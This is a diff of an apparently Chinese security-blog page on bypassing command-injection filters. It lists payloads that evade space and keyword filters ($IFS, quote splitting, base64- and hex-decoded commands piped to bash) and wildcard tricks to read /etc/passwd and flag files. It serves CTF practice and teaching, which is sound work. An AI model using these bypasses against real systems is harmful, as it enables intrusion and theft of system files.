@@ -177,29 +177,29 @@
 <p>A|B: 管道命令，如：dir <em>.</em> /s/a | find /c &quot;.exe&quot; 表示：先执行 dir 命令，对其输出的结果执行后面的 find 命令</p>
 <p>A||B: 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</p>
 <h3 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h3><p>空格绕过</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">$IFS
-$IFS$1
-$&#123;IFS&#125;
-$IFS$9
-&lt;	 比如cat&lt;a.tct:表示cat a.txt
-&lt;&gt;
-&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token environment constant">$IFS</span>
+<span class="token environment constant">$IFS</span><span class="token variable">$1</span>
+<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>
+<span class="token environment constant">$IFS</span><span class="token variable">$9</span>
+<span class="token operator">&lt;</span>	 比如cat<span class="token operator">&lt;</span>a.tct:表示cat a.txt
+<span class="token operator">&lt;></span>
+<span class="token punctuation">&#123;</span>cat,flag.php<span class="token punctuation">&#125;</span>  //用逗号实现了空格功能，需要用<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>括起来
 %20
 %09</code></pre>
 
 <p>绕过关键字</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">wh\o\ami    &#x2F;&#x2F;反斜线绕过
-who&quot;a&quot;mi    &#x2F;&#x2F;双引号绕过
-whoa&#39;m&#39;i    &#x2F;&#x2F;单引号绕过
-whoam&#96;&#96;i    &#x2F;&#x2F;反引号绕过
-echo d2hvYW1p|base64 -d|sh  &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码
-echo d2hvYW1p|base64 -d|bash&#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码
-&#96;echo d2hvYW1p|base64 -d&#96; &#x2F;&#x2F;将其base64解码,然后用反引号来执行命令
-echo 77686F616D69 | xxd -r -p | bash &#x2F;&#x2F;hex绕过,其中77686F616D69是whoami的hex编码
-&#x2F;&#x2F;$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;&#x3D;10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:
-wh$1oami
-who$@ami
-whoa$*mi</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell">wh<span class="token punctuation">\</span>o<span class="token punctuation">\</span>ami    //反斜线绕过
+<span class="token function">who</span><span class="token string">"a"</span>mi    //双引号绕过
+whoa<span class="token string">'m'</span>i    //单引号绕过
+whoam`<span class="token variable"><span class="token variable">`</span>i    //反引号绕过
+<span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">sh</span>  //base64绕过,其中d2hvYW1p是whoami的base64编码
+<span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d<span class="token operator">|</span>bash//base64绕过,其中d2hvYW1p是whoami的base64编码
+<span class="token variable">`</span></span><span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d` //将其base64解码,然后用反引号来执行命令
+<span class="token builtin class-name">echo</span> 77686F616D69 <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> <span class="token function">bash</span> //hex绕过,其中77686F616D69是whoami的hex编码
+//<span class="token variable">$*</span>和<span class="token variable">$@</span>，<span class="token variable">$x</span><span class="token punctuation">(</span>x 代表 <span class="token number">1</span>-9<span class="token punctuation">)</span>,<span class="token variable">$&#123;x&#125;</span><span class="token punctuation">(</span>x<span class="token operator">>=</span><span class="token number">10</span><span class="token punctuation">)</span> :比如ca<span class="token variable">$&#123;21&#125;</span>t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:
+wh<span class="token variable">$1oami</span>
+<span class="token function">who</span><span class="token variable">$@</span>ami
+whoa<span class="token variable">$*</span>mi</code></pre>
 
 <p>任意字符插入执行（可绕过命令和文件名）</p>
 <pre class="language-none"><code class="language-none">cat &#x2F;f&#96;who&#96;la&#96;ks&#96;g	反斜杠之间的字符会作为命令执行
@@ -213,10 +213,10 @@ cat fla*                                         &#x2F;&#x2F;用*匹配任意
 a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.php 表示cat flag.php       &#x2F;&#x2F;内联执行</code></pre>
 
 <p>文件名绕过</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">利用正则:比如要读取etc&#x2F;passwd
-cat &#x2F;???&#x2F;??????
-cat &#x2F;???&#x2F;pass*
-cat &#x2F;etc$u&#x2F;passwd</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell">利用正则:比如要读取etc/passwd
+<span class="token function">cat</span> /???/??????
+<span class="token function">cat</span> /???/pass*
+<span class="token function">cat</span> /etc<span class="token variable">$u</span>/passwd</code></pre>
 
 <p>命令执行函数绕过</p>
 <pre class="language-none"><code class="language-none">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)
